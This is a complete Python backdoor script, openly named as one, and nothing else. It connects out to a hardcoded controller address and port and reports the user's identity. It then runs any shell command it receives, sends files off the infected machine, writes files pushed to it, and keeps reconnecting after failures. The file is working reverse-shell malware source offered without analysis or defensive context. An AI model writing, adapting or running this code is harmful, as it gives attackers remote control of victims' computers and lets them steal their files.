import socket,subprocess,os,time

class Backdoor:

    def __init__(self, IP, PORT):
        self.IP = IP
        self.PORT = PORT
        self.connect(self.IP, self.PORT)
        
    def connect(self, IP, PORT):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((IP,PORT))
            self.r_send(self.exec_cmd("whoami"))
        except OSError:
            time.sleep(2)
            self.connect(self.IP, self.PORT)
            
    def exec_cmd(self, cmd):
        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
        stdout = res.stdout.read().decode().strip()
        stderr = res.stderr.read().decode().strip()
        if stdout:
            return (stdout)
        elif stderr:
            return (stderr)
    
    def r_send(self, msg):
        try:
            msg +="done"
            msg = msg.encode()
            self.connection.send(msg)
        except TypeError:
            pass

    def r_recv(self):
        return self.connection.recv(1024).decode()
    
    def change_dir(self,dirr):
        try:
            os.chdir(dirr)
            self.r_send(self.exec_cmd("pwd"))
        except Exception as e:
            self.r_send(str(e))
        
    def upload(self,filename):
        if os.path.exists(filename):
            f = open(filename,'rb')
            packet = f.read(1024)
            while(len(packet)>0):
                self.connection.send(packet)
                packet = f.read(1024)
            self.connection.send("done".encode())
        else:
            self.connection.send("[-] File not found".encode())

    def download(self, filename):
        f = open(filename,"wb")
        while(True):
            packet = self.connection.recv(1024)
            if "[-] File not found".encode() in packet:
                f.close()
                os.remove(filename)
                break
            elif packet.endswith("done".encode()):
                f.write(packet[:-4])
                f.close()
                break
            f.write(packet)

    def run(self):
        while(True):
            try:
                cmd = self.r_recv()
                cmd = cmd.split(' ')
                if cmd[0] == "cd" and len(cmd)>1:
                    self.change_dir(cmd[1])
                elif cmd[0] == "download":
                    print("in download")
                    self.upload(cmd[1])
                elif cmd[0] == "upload":
                    self.download(cmd[1])
                elif cmd[0] == "terminate":
                    self.connect(self.IP, self.PORT)
                elif cmd[0] == "clear":
                    self.run()

                elif len(cmd)>0:
                    print('in elif')
                    cmd = ' '.join(cmd)
                    result = self.exec_cmd(cmd)
                    self.r_send(result)
                    
            except ConnectionResetError:
                self.connect(self.IP, self.PORT)



backdoor = Backdoor("192.168.1.99",2000)
backdoor.run()